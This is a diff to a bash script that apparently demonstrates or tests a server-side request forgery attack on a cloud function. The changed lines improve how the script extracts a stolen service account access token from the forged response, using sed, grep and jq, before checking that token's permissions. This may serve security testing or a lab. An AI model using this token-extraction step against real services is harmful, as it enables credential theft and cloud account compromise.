@@ -344,12 +344,19 @@ if echo "$SSRF_RESPONSE" | grep -q "function_account"; then
     print_info "Function's service account token is accessible"
     
     # Extract the token from the response - handle nested JSON
-    # First extract the function_account value, then parse the nested access_token
-    FUNCTION_ACCOUNT=$(echo "$SSRF_RESPONSE" | grep -o '"function_account": "[^"]*"' | cut -d'"' -f4)
+    # The function_account field contains an escaped JSON string
+    # First extract everything between "function_account": " and the next unescaped quote
+    FUNCTION_ACCOUNT=$(echo "$SSRF_RESPONSE" | sed -n 's/.*"function_account": "\(.*\)".*/\1/p' | head -1)
     
-    # The function_account contains escaped JSON, so we need to parse it
-    # Use grep and cut to extract the access_token value from the nested JSON
-    EXTRACTED_TOKEN=$(echo "$FUNCTION_ACCOUNT" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
+    # The function_account contains escaped JSON, so we need to unescape and parse it
+    # First unescape the JSON (replace \" with "), then extract the access_token
+    EXTRACTED_TOKEN=$(echo "$FUNCTION_ACCOUNT" | sed 's/\\"/"/g' | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
+    
+    # If the first method didn't work and jq is available, try using jq for more robust parsing
+    if [ -z "$EXTRACTED_TOKEN" ] && command -v jq &> /dev/null; then
+        print_info "Attempting JSON parsing with jq..."
+        EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | jq -r '.function_account' 2>/dev/null | jq -r '.access_token' 2>/dev/null)
+    fi
     
     if [ -n "$EXTRACTED_TOKEN" ]; then
         print_info "Validating extracted token's permissions..."
